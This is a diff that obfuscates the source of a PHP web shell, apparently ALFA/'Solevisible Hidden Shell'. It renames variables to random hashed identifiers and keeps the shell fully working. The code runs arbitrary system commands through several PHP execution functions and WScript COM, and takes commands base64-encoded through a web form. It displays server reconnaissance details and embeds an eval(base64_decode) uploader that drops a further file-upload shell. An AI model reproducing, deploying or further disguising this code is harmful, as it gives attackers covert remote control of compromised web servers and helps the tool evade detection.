+function _alfa_php_cmd($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf,$gjtltovk12eccbdd9b32918131341f38907cbbb5=false){
+$vemvtkqkc68271a63ddbc431c307beb7d2918275='';
 try{
-if($re)$in=$in." 2>&1";
+if($gjtltovk12eccbdd9b32918131341f38907cbbb5)$ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf=$ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf." 2>&1";
 if(function_exists('exec')){
-@exec($in,$out);
-$out = @join("\n",$out);
+@exec($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf,$vemvtkqkc68271a63ddbc431c307beb7d2918275);
+$vemvtkqkc68271a63ddbc431c307beb7d2918275 = @join("\n",$vemvtkqkc68271a63ddbc431c307beb7d2918275);
 }elseif(function_exists('passthru')) {
 ob_start();
-@passthru($in);
-$out = ob_get_clean();
+@passthru($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf);
+$vemvtkqkc68271a63ddbc431c307beb7d2918275 = ob_get_clean();
 }elseif(function_exists('system')){
 ob_start();
-@system($in);
-$out = ob_get_clean();
+@system($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf);
+$vemvtkqkc68271a63ddbc431c307beb7d2918275 = ob_get_clean();
 } elseif (function_exists('shell_exec')) {
-$out = shell_exec($in);
+$vemvtkqkc68271a63ddbc431c307beb7d2918275 = shell_exec($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf);
 }elseif(function_exists("popen")&&function_exists("pclose")){
-if(is_resource($f = @popen($in,"r"))){
-$out = "";
-while(!@feof($f))
-$out .= fread($f,1024);
-pclose($f);
+if(is_resource($npviloqa8fa14cdd754f91cc6554c9e71929cce7 = @popen($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf,"r"))){
+$vemvtkqkc68271a63ddbc431c307beb7d2918275 = "";
+while(!@feof($npviloqa8fa14cdd754f91cc6554c9e71929cce7))
+$vemvtkqkc68271a63ddbc431c307beb7d2918275 .= fread($npviloqa8fa14cdd754f91cc6554c9e71929cce7,1024);
+pclose($npviloqa8fa14cdd754f91cc6554c9e71929cce7);
 }
 }elseif(function_exists('proc_open')){
-$pipes = array();
-$process = @proc_open($in.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $pipes, null);
-$out=@stream_get_contents($pipes[1]);
+$irepvwla24a9384d408f3fa1654c08dfaea45dd3 = array();
+$kuiuelsn5075140835d0bc504791c76b04c33d2b = @proc_open($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $irepvwla24a9384d408f3fa1654c08dfaea45dd3, null);
+$vemvtkqkc68271a63ddbc431c307beb7d2918275=@stream_get_contents($irepvwla24a9384d408f3fa1654c08dfaea45dd3[1]);
 }elseif(class_exists('COM')){
-$alfaWs = new COM('WScript.shell');
-$exec = $alfaWs->exec('cmd.exe /c '.$_POST['alfa1']);
-$stdout = $exec->StdOut();
-$out=$stdout->ReadAll();
+$nghggwdtc567b60e5c351a8398d002e31a9408e4 = new COM('WScript.shell');
+$tlbcubki52fb3679b07eb74d90784e612ca5cb30 = $nghggwdtc567b60e5c351a8398d002e31a9408e4->exec('cmd.exe /c '.$_POST['alfa1']);
+$ffspzket64322f5f3ff7f9f717279e1b017a997e = $tlbcubki52fb3679b07eb74d90784e612ca5cb30->StdOut();
+$vemvtkqkc68271a63ddbc431c307beb7d2918275=$ffspzket64322f5f3ff7f9f717279e1b017a997e->ReadAll();
 }
-}catch(Exception $e){}
-return $out;
+}catch(Exception $qxcuilgde1671797c52e15f763380b45e841ec32){}
+return $vemvtkqkc68271a63ddbc431c307beb7d2918275;
 }
-function _alfa_fsockopen($server,$uri,$post){
-	$socket = @fsockopen($server, 80, $errno, $errstr, 15);
-	if($socket){
-		$http  = "POST {$uri} HTTP/1.0\r\n";
-		$http .= "Host: {$server}\r\n";
-		$http .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
-		$http .= "Content-Type: application/x-www-form-urlencoded\r\n";
-		$http .= "Content-length: " . strlen($post) . "\r\n";
-		$http .= "Connection: close\r\n\r\n";
-		$http .= $post . "\r\n\r\n";
-		fwrite($socket, $http);
-		$contents = "";
-		while (!@feof($socket)) {
-			$contents .= @fgets($socket, 4096);
+function _alfa_fsockopen($patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3,$wtsjcykq9305b73d359bd06734fee0b3638079e1,$viovyaoc42b90196b487c54069097a68fe98ab6f){
+	$bbpyrbrt61f2529360aec54f5dc9804b842cf3fa = @fsockopen($patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3, 80, $irrxgcsz70106d0d821513f45702b7d25664ab7c, $ivgnqlyv809b1abe3f111fd3bb1a54c62706129f, 15);
+	if($bbpyrbrt61f2529360aec54f5dc9804b842cf3fa){
+		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8  = "POST {$wtsjcykq9305b73d359bd06734fee0b3638079e1} HTTP/1.0\r\n";
+		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 .= "Host: {$patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3}\r\n";
+		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
+		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 .= "Content-Type: application/x-www-form-urlencoded\r\n";
+		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 .= "Content-length: " . strlen($viovyaoc42b90196b487c54069097a68fe98ab6f) . "\r\n";
+		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 .= "Connection: close\r\n\r\n";
+		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 .= $viovyaoc42b90196b487c54069097a68fe98ab6f . "\r\n\r\n";
+		fwrite($bbpyrbrt61f2529360aec54f5dc9804b842cf3fa, $pvoljqdc80791b3ae7002cb88c246876d9faa8f8);
+		$dlivxtrp98bf7d8c15784f0a3d63204441e1e2aa = "";
+		while (!@feof($bbpyrbrt61f2529360aec54f5dc9804b842cf3fa)) {
+			$dlivxtrp98bf7d8c15784f0a3d63204441e1e2aa .= @fgets($bbpyrbrt61f2529360aec54f5dc9804b842cf3fa, 4096);
 		}
-		list($header, $body) = explode("\r\n\r\n", $contents, 2);
-		@fclose($socket);
-		return $body;
+		list($fpzdcspv099fb995346f31c749f6e40db0f395e3, $bultgmdu841a2d689ad86bd1611447453c22c6fc) = explode("\r\n\r\n", $dlivxtrp98bf7d8c15784f0a3d63204441e1e2aa, 2);
+		@fclose($bbpyrbrt61f2529360aec54f5dc9804b842cf3fa);
+		return $bultgmdu841a2d689ad86bd1611447453c22c6fc;
 	}else{
 		return "";
 	}
@@ -819,18 +893,18 @@ echo '<html>';
 echo "<title>Solevisible Hidden Shell</title>";
 echo "<body bgcolor=#000000>";
 echo '<b><big><font color=#7CFC00>Kernel : </font><font color="#FFFFF">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
-$safe_mode = @ini_get('safe_mode');
-if($safe_mode){$r = "<b style='color: red'>On</b>";}else{$r = "<b style='color: green'>Off</b>";}
+$advbtcgoee5bd868ca96203f40dcfbcf40ea2a06 = @ini_get('safe_mode');
+if($advbtcgoee5bd868ca96203f40dcfbcf40ea2a06){$yxarqqmp4b43b0aee35624cd95b910189b3dc231 = "<b style='color: red'>On</b>";}else{$yxarqqmp4b43b0aee35624cd95b910189b3dc231 = "<b style='color: green'>Off</b>";}
 echo "<br><b style='color: #7CFC00'>OS: </font><font color=white>" . PHP_OS . "</font><br>";
 echo "<b style='color: #7CFC00'>Software: </font><font color=white>" . $_SERVER ['SERVER_SOFTWARE'] . "</font><br>";
 echo "PHP Version: <font color=white>" . PHP_VERSION .  "</font><br />";
 echo "PWD:<font color=#FFFFFF> " . str_replace("\\","/",@alfaGetCwd()) . "/<br />";
-echo "<b style='color: #7CFC00'>Safe Mode : $r<br>";
+echo "<b style='color: #7CFC00'>Safe Mode : $yxarqqmp4b43b0aee35624cd95b910189b3dc231<br>";
 echo"<font color=#7CFC00>Disable functions : </font>";
-$disfun = @ini_get('disable_functions');
-if(empty($disfun)){$disfun = '<font color="green">NONE</font>';}
+$seoudwvg0b30ee767bb8b426744976e10337f56e = @ini_get('disable_functions');
+if(empty($seoudwvg0b30ee767bb8b426744976e10337f56e)){$seoudwvg0b30ee767bb8b426744976e10337f56e = '<font color="green">NONE</font>';}
 echo"<font color=red>";
-echo "$disfun";
+echo "$seoudwvg0b30ee767bb8b426744976e10337f56e";
 echo"</font><br>";
 echo "<b style='color: #7CFC00'>Your Ip Address is :  </font><font color=white>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
 echo "<b style='color: #7CFC00'>Server Ip Address is :  </font><font color=white>".(function_exists('gethostbyname')?@gethostbyname($_SERVER["HTTP_HOST"]):'???')."</font><br><p>";
@@ -843,9 +917,9 @@ else{echo '<center><b><font color="#7CFC00">Upload failed :(</font></a><font col
 echo '<hr><form onSubmit="this.execute.disabled=true;this.command_solevisible.value = btoa(unescape(encodeURIComponent(this.command_solevisible.value)));" method="POST">Execute Command: <input name="command_solevisible" value="" size="59" type="text" align="left" ><input name="execute" value="Execute" type="submit"><br></form>
 <hr><pre>';
 if(isset($_POST['command_solevisible'])){
-if(strtolower(substr(PHP_OS,0,3))=="win")$separator='&';else $separator=';';
-$solevisible = "cd '".addslashes(str_replace("\\","/",@alfaGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_solevisible']);
-echo alfaEx($solevisible);
+if(strtolower(substr(PHP_OS,0,3))=="win")$wkncvkwsa0f0bc95016c862498bbad29d1f4d9d4='&';else $wkncvkwsa0f0bc95016c862498bbad29d1f4d9d4=';';
+$syosrpmxd4a590caacc0be55ef286e40a945ea45 = "cd '".addslashes(str_replace("\\","/",@alfaGetCwd()))."'".$wkncvkwsa0f0bc95016c862498bbad29d1f4d9d4."".__ZGVjb2Rlcg($_POST['command_solevisible']);
+echo alfaEx($syosrpmxd4a590caacc0be55ef286e40a945ea45);
 }
 echo'</pre>
 </body></html>';
@@ -859,22 +933,22 @@ exit;}
 if(function_exists('set_magic_quotes_runtime')){
 @set_magic_quotes_runtime(0);
 }
-foreach($_POST as $key => $value){
-if(is_array($_POST[$key])){
-$i=0;
-foreach($_POST[$key] as $f) {
-$f = trim(str_replace(' ', '+',$f));
-$_POST[$key][$i] = decrypt_post($f);
-$i++;
+foreach($_POST as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804){
+if(is_array($_POST[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d])){
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0;
+foreach($_POST[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d] as $npviloqa8fa14cdd754f91cc6554c9e71929cce7) {
+$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = trim(str_replace(' ', '+',$npviloqa8fa14cdd754f91cc6554c9e71929cce7));
+$_POST[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d][$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] = decrypt_post($npviloqa8fa14cdd754f91cc6554c9e71929cce7);
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++;
 }
 }else{
-$value = trim(str_replace(' ', '+',$value));
-$_POST[$key] = decrypt_post($value);
+$rkptsoeg2063c1608d6e0baf80249c42e2be5804 = trim(str_replace(' ', '+',$rkptsoeg2063c1608d6e0baf80249c42e2be5804));
+$_POST[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d] = decrypt_post($rkptsoeg2063c1608d6e0baf80249c42e2be5804);
 }
 }
-$default_action = 'FilesMan2';//'FilesMan';
-$default_use_ajax = true;
-$default_charset = 'Windows-1251';
+$qsvrxdva707d47ef3e8b55054789cb477a5e0c0f = 'FilesMan2';//'FilesMan';
+$kcthqfwp9460f24199513932be5ce352f337ace0 = true;
+$awvrbpxm7ca54e47c6413ba02f536119d50d38bd = 'Windows-1251';
 if(strtolower(substr(PHP_OS,0,3))=="win")
 $GLOBALS['sys']='win';
 else
@@ -896,160 +970,160 @@ $GLOBALS['home_cwd'] = str_replace("\\", "/", $GLOBALS['home_cwd']);
 $GLOBALS['cwd'] = str_replace("\\", "/", $GLOBALS['cwd']);
 }
 if($GLOBALS['cwd'][strlen($GLOBALS['cwd'])-1] != '/' )$GLOBALS['cwd'] .= '/';
-if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir() {foreach (array('TMP', 'TEMP', 'TMPDIR') as $env_var) {if ($temp = getenv($env_var)) {return $temp;}}$temp = tempnam($GLOBALS['__file_path'], '');if (_alfa_file_exists($temp,false)) {unlink($temp);return dirname($temp);}return null;}}
+if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir() {foreach (array('TMP', 'TEMP', 'TMPDIR') as $rmfooptx8004212c372da90114957b5f2acd47ef) {if ($dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f = getenv($rmfooptx8004212c372da90114957b5f2acd47ef)) {return $dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f;}}$dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f = tempnam($GLOBALS['__file_path'], '');if (_alfa_file_exists($dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f,false)) {unlink($dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f);return dirname($dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f);}return null;}}
 if(!function_exists("mb_strlen")){
-	function mb_strlen($str, $c=""){
-		return strlen($str);
+	function mb_strlen($okjeiabf341be97d9aff90c9978347f66f945b77, $yyphbkaj4a8a08f09d37b73795649038408b5f33=""){
+		return strlen($okjeiabf341be97d9aff90c9978347f66f945b77);
 	}
 }
 if(!function_exists("mb_substr")){
-	function mb_substr($str, $start, $end, $c=""){
-		return substr($str, $start, $end);
+	function mb_substr($okjeiabf341be97d9aff90c9978347f66f945b77, $lshuoojwea2b2676c28c0db26d39331a336c6b92, $qahbjcwq7f021a1415b86f2d013b2618fb31ae53, $yyphbkaj4a8a08f09d37b73795649038408b5f33=""){
+		return substr($okjeiabf341be97d9aff90c9978347f66f945b77, $lshuoojwea2b2676c28c0db26d39331a336c6b92, $qahbjcwq7f021a1415b86f2d013b2618fb31ae53);
 	}
 }
 define("ALFA_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
 function alfahead(){
 $GLOBALS['__ALFA_SHELL_CODE'] = 'PD9waHAgZWNobyAiPHRpdGxlPlNvbGV2aXNpYmxlIFVwbG9hZGVyPC90aXRsZT5cbjxib2R5IGJnY29sb3I9IzAwMDAwMD5cbjxicj5cbjxjZW50ZXI+PGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjxiPllvdXIgSXAgQWRkcmVzcyBpczwvYj4gPGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjwvZm9udD48L2NlbnRlcj5cbjxiaWc+PGZvbnQgY29sb3I9XCIjN0NGQzAwXCI+PGNlbnRlcj5cbiI7ZWNobyAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTtlY2hvICI8L2NlbnRlcj48L2ZvbnQ+PC9hPjxmb250IGNvbG9yPVwiIzdDRkMwMFwiPlxuPGJyPlxuPGJyPlxuPGNlbnRlcj48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48YmlnPlNvbGV2aXNpYmxlIFVwbG9hZCBBcmVhPC9iaWc+PC9mb250PjwvYT48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48L2ZvbnQ+PC9jZW50ZXI+PGJyPlxuPGNlbnRlcj48Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnIG5hbWU9J3VwbG9hZGVyJz4iO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI0NSI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT48L2NlbnRlcj4nO2lmKGlzc2V0KCRfUE9TVFsnX3VwbCddKSYmJF9QT1NUWydfdXBsJ109PSAiVXBsb2FkIil7aWYoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkge2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBTdWNjZXNzZnVsbHkgOyk8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO31lbHNle2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBmYWlsZWQgOig8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO319ZWNobyAnPGNlbnRlcj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjMwcHg7IGJhY2tncm91bmQ6IHVybCgmcXVvdDtodHRwOi8vc29sZXZpc2libGUuY29tL2ltYWdlcy9iZ19lZmZlY3RfdXAuZ2lmJnF1b3Q7KSByZXBlYXQteCBzY3JvbGwgMCUgMCUgdHJhbnNwYXJlbnQ7IGNvbG9yOiByZWQ7IHRleHQtc2hhZG93OiA4cHggOHB4IDEzcHg7Ij48c3Ryb25nPjxiPjxiaWc+c29sZXZpc2libGVAZ21haWwuY29tPC9iPjwvYmlnPjwvc3Ryb25nPjwvc3Bhbj48L2NlbnRlcj4nOz8+';
-$alfa_uploader = '$x = base64_decode("'.$GLOBALS['__ALFA_SHELL_CODE'].'");$solevisible = fopen("solevisible.php","w");fwrite($solevisible,$x);';
-define("ALFA_UPLOADER", "eval(base64_decode('".__ZW5jb2Rlcg($alfa_uploader)."'))");
+$djgefzabfa291e147a24773b9932f4c6f05746d3 = '$x = base64_decode("'.$GLOBALS['__ALFA_SHELL_CODE'].'");$solevisible = fopen("solevisible.php","w");fwrite($solevisible,$x);';
+define("ALFA_UPLOADER", "eval(base64_decode('".__ZW5jb2Rlcg($djgefzabfa291e147a24773b9932f4c6f05746d3)."'))");
 if(!isset($_POST['ajax'])){
 function Alfa_GetDisable_Function(){
-$disfun = @ini_get('disable_functions');
-$afa = '<span class="header_show_all">All Functions Accessible</span>';
-if(empty($disfun))return($afa);
-$s = explode(',',$disfun);
-$s = array_unique($s);
-$i=0;
-$b=0;
-$func = array('system','exec','shell_exec','proc_open','popen','passthru','symlink','dl');
-$black_list = array();
-$allow_list = array();
-foreach($s as $d){
-	$d=trim($d);
-	if(empty($d)||!is_callable($d))continue;
-	if(!function_exists($d)){
-		if(in_array($d,$func)){
-			$dis .= $d." | ";$b++;
-			$black_list[] = $d;
+$seoudwvg0b30ee767bb8b426744976e10337f56e = @ini_get('disable_functions');
+$bqvpaqdadcf5500c7e53721d4b016e4793d5dd66 = '<span class="header_show_all">All Functions Accessible</span>';
+if(empty($seoudwvg0b30ee767bb8b426744976e10337f56e))return($bqvpaqdadcf5500c7e53721d4b016e4793d5dd66);
+$fwekvgvg03c7c0ace395d80182db07ae2c30f034 = explode(',',$seoudwvg0b30ee767bb8b426744976e10337f56e);
+$fwekvgvg03c7c0ace395d80182db07ae2c30f034 = array_unique($fwekvgvg03c7c0ace395d80182db07ae2c30f034);
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0;
+$aospafqz92eb5ffee6ae2fec3ad71c777531578f=0;
+$uhkponec7df4935f4a5a2865191ef74f64df8754 = array('system','exec','shell_exec','proc_open','popen','passthru','symlink','dl');
+$vodjcxqx9729522c086a8f36e30ec6b23b410aa7 = array();
+$uzlrkegm6defe7a7a9ad85b49099b7e6e3668bc6 = array();
+foreach($fwekvgvg03c7c0ace395d80182db07ae2c30f034 as $iwxbtdws8277e0910d750195b448797616e091ad){
+	$iwxbtdws8277e0910d750195b448797616e091ad=trim($iwxbtdws8277e0910d750195b448797616e091ad);
+	if(empty($iwxbtdws8277e0910d750195b448797616e091ad)||!is_callable($iwxbtdws8277e0910d750195b448797616e091ad))continue;
+	if(!function_exists($iwxbtdws8277e0910d750195b448797616e091ad)){
+		if(in_array($iwxbtdws8277e0910d750195b448797616e091ad,$uhkponec7df4935f4a5a2865191ef74f64df8754)){
+			$pkzgtivg4cdf5a25d4673bfc4546ca7843071f65 .= $iwxbtdws8277e0910d750195b448797616e091ad." | ";$aospafqz92eb5ffee6ae2fec3ad71c777531578f++;
+			$vodjcxqx9729522c086a8f36e30ec6b23b410aa7[] = $iwxbtdws8277e0910d750195b448797616e091ad;
 		}else{
-			$allow_list[] = $d;
+			$uzlrkegm6defe7a7a9ad85b49099b7e6e3668bc6[] = $iwxbtdws8277e0910d750195b448797616e091ad;
 		}
-		$i++;
+		$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++;
 	}
 }
-if($i==0)return($afa);
-if($i <= count($func)){
-$all = array_values(array_merge($black_list, $allow_list));
-return('<span class="disable_functions">'.implode(" | ", $all).'</span>');
+if($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741==0)return($bqvpaqdadcf5500c7e53721d4b016e4793d5dd66);
+if($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 <= count($uhkponec7df4935f4a5a2865191ef74f64df8754)){
+$qcsrkruna181a603769c1f98ad927e7367c7aa51 = array_values(array_merge($vodjcxqx9729522c086a8f36e30ec6b23b410aa7, $uzlrkegm6defe7a7a9ad85b49099b7e6e3668bc6));
+return('<span class="disable_functions">'.implode(" | ", $qcsrkruna181a603769c1f98ad927e7367c7aa51).'</span>');
 }
-return('<span class="disable_functions">'.$dis.'</span><a id="menu_opt_GetDisFunc" href=javascript:void(0) onclick="alfa_can_add_opt = true;g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All ('.$i.')</span></a>');
+return('<span class="disable_functions">'.$pkzgtivg4cdf5a25d4673bfc4546ca7843071f65.'</span><a id="menu_opt_GetDisFunc" href=javascript:void(0) onclick="alfa_can_add_opt = true;g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All ('.$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741.')</span></a>');
 }
 function AlfaNum(){
-$args = func_get_args();
-$alfax = array();
-$find = array();
-for($i=1;$i<=10;$i++){
-$alfax[] = $i;
+$dnqkqniqa956af09162870af6ce4ebe0f12ccaf8 = func_get_args();
+$niytpinla6c6dd28743c140aa4aa98c4669eea39 = array();
+$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4 = array();
+for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<=10;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++){
+$niytpinla6c6dd28743c140aa4aa98c4669eea39[] = $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741;
 }
-foreach($args as $arg){
-$find[] = $arg;
+foreach($dnqkqniqa956af09162870af6ce4ebe0f12ccaf8 as $mcpievhm61dd86c2dc75c3f569ec619bd283a33f){
+$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4[] = $mcpievhm61dd86c2dc75c3f569ec619bd283a33f;
 }
 echo '<script>';
-foreach($alfax as $alfa){
-if(in_array($alfa,$find))
+foreach($niytpinla6c6dd28743c140aa4aa98c4669eea39 as $rpatbarj56aed7e7485ff03d5605b885b86e947e){
+if(in_array($rpatbarj56aed7e7485ff03d5605b885b86e947e,$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4))
 continue;
-echo 'alfa'.$alfa."_=";
+echo 'alfa'.$rpatbarj56aed7e7485ff03d5605b885b86e947e."_=";
 }
 echo '""</script>';
 }
 if(empty($_POST['charset']))
 $_POST['charset'] = $GLOBALS['default_charset'];
-$freeSpace = function_exists('diskfreespace')?@diskfreespace($GLOBALS['cwd']):'?';
-$totalSpace = function_exists('disk_total_space')?@disk_total_space($GLOBALS['cwd']):'?';
-$totalSpace = $totalSpace?$totalSpace:1;
-$on="<span class='header_on'> ON </span>";
-$of="<span class='header_off'> OFF </span>";
-$none="<span class='header_none'> NONE </span>";
+$umbdwmvqa9cc6a00f8695708b1579c7988207667 = function_exists('diskfreespace')?@diskfreespace($GLOBALS['cwd']):'?';
+$irtldmrodb28f3b2aefa09d63dcd57583254de71 = function_exists('disk_total_space')?@disk_total_space($GLOBALS['cwd']):'?';
+$irtldmrodb28f3b2aefa09d63dcd57583254de71 = $irtldmrodb28f3b2aefa09d63dcd57583254de71?$irtldmrodb28f3b2aefa09d63dcd57583254de71:1;
+$kvinbkgied2b5c0139cec8ad2873829dc1117d50="<span class='header_on'> ON </span>";
+$xgirxeia8bf8854bebe108183caeb845c7676ae4="<span class='header_off'> OFF </span>";
+$axfemcil334c4a4c42fdb79d7ebc3e73b517e6f8="<span class='header_none'> NONE </span>";
 if(function_exists('ssh2_connect'))
-$ssh2=$on;
+$njiaostw1eb174fa332c502d2b4929d74e5d1d64=$kvinbkgied2b5c0139cec8ad2873829dc1117d50;
 else
-$ssh2=$of;
+$njiaostw1eb174fa332c502d2b4929d74e5d1d64=$xgirxeia8bf8854bebe108183caeb845c7676ae4;
 if(function_exists('curl_version'))
-$curl=$on;
+$qqhrnrcwf6e57c9de709e45feb0d955351f53548=$kvinbkgied2b5c0139cec8ad2873829dc1117d50;
 else
-$curl=$of;
+$qqhrnrcwf6e57c9de709e45feb0d955351f53548=$xgirxeia8bf8854bebe108183caeb845c7676ae4;
 if(function_exists('mysql_get_client_info')||class_exists('mysqli'))
-$mysql=$on;
+$uadvcujo81c3b080dad537de7e10e0987a4bf52e=$kvinbkgied2b5c0139cec8ad2873829dc1117d50;
 else
-$mysql=$of;
+$uadvcujo81c3b080dad537de7e10e0987a4bf52e=$xgirxeia8bf8854bebe108183caeb845c7676ae4;
 if(function_exists('mssql_connect'))
-$mssql=$on;
+$dffrmfjea0589ddd20d56ac0fd4c8f1c83177672=$kvinbkgied2b5c0139cec8ad2873829dc1117d50;
 else
-$mssql=$of;
+$dffrmfjea0589ddd20d56ac0fd4c8f1c83177672=$xgirxeia8bf8854bebe108183caeb845c7676ae4;
 if(function_exists('pg_connect'))
-$pg=$on;
+$viobjnle235ec52392b77977539cf78b62e708d3=$kvinbkgied2b5c0139cec8ad2873829dc1117d50;
 else
-$pg=$of;
+$viobjnle235ec52392b77977539cf78b62e708d3=$xgirxeia8bf8854bebe108183caeb845c7676ae4;
 if(function_exists('oci_connect'))
-$or=$on;
+$okougdode81c4e4f2b7b93b481e13a8553c2ae1b=$kvinbkgied2b5c0139cec8ad2873829dc1117d50;
 else
-$or=$of;
+$okougdode81c4e4f2b7b93b481e13a8553c2ae1b=$xgirxeia8bf8854bebe108183caeb845c7676ae4;
 if(@ini_get('disable_functions'))
-$disfun=@ini_get('disable_functions');
+$seoudwvg0b30ee767bb8b426744976e10337f56e=@ini_get('disable_functions');
 else
-$disfun="All Functions Enable";
+$seoudwvg0b30ee767bb8b426744976e10337f56e="All Functions Enable";
 if(@ini_get('safe_mode'))
-$safe_modes="<span class='header_off'>ON</span>";
+$dcwnlocgd27c87d911f030008cce9ab55024113f="<span class='header_off'>ON</span>";
 else
-$safe_modes="<span class='header_on'>OFF</span>";
-$cgi_shell="<span class='header_off' id='header_cgishell'>OFF</span>";
+$dcwnlocgd27c87d911f030008cce9ab55024113f="<span class='header_on'>OFF</span>";
+$yowbntez96b22492d937bc3ace31d0abe38ba66d="<span class='header_off' id='header_cgishell'>OFF</span>";
 if(@ini_get('open_basedir')){
-$basedir_data = @ini_get('open_basedir');
-if(strlen($basedir_data)>120){
-$open_b=substr($basedir_data,0, 120)."...";
+$qduadmup6edc515a5ce032f7b1b7260406bca1ed = @ini_get('open_basedir');
+if(strlen($qduadmup6edc515a5ce032f7b1b7260406bca1ed)>120){
+$reeyunzd5289df8a8663eeaea5de3baad848212d=substr($qduadmup6edc515a5ce032f7b1b7260406bca1ed,0, 120)."...";
 }else{
-$open_b = $basedir_data;
+$reeyunzd5289df8a8663eeaea5de3baad848212d = $qduadmup6edc515a5ce032f7b1b7260406bca1ed;
 }
-}else{$open_b=$none;}
+}else{$reeyunzd5289df8a8663eeaea5de3baad848212d=$axfemcil334c4a4c42fdb79d7ebc3e73b517e6f8;}
 if(@ini_get('safe_mode_exec_dir'))
-$safe_exe=@ini_get('safe_mode_exec_dir');
+$iajnyxqb4c128155fac3a64697dbf1e7f69fa16d=@ini_get('safe_mode_exec_dir');
 else
-$safe_exe=$none;
+$iajnyxqb4c128155fac3a64697dbf1e7f69fa16d=$axfemcil334c4a4c42fdb79d7ebc3e73b517e6f8;
 if(@ini_get('safe_mode_include_dir'))
-$safe_include=@ini_get('safe_mode_include_dir');
+$kodnhifb3fc7c001fae08c7c5462a0aa84e0edc0=@ini_get('safe_mode_include_dir');
 else
-$safe_include=$none;
+$kodnhifb3fc7c001fae08c7c5462a0aa84e0edc0=$axfemcil334c4a4c42fdb79d7ebc3e73b517e6f8;
 if(!function_exists('posix_getegid'))
 {
-$user = function_exists("get_current_user")?@get_current_user():"????";
-$uid = function_exists("getmyuid")?@getmyuid():"????";
-$gid = function_exists("getmygid")?@getmygid():"????";
-$group = "?";
+$eeodyzriee11cbb19052e40b07aac0ca060c23ee = function_exists("get_current_user")?@get_current_user():"????";
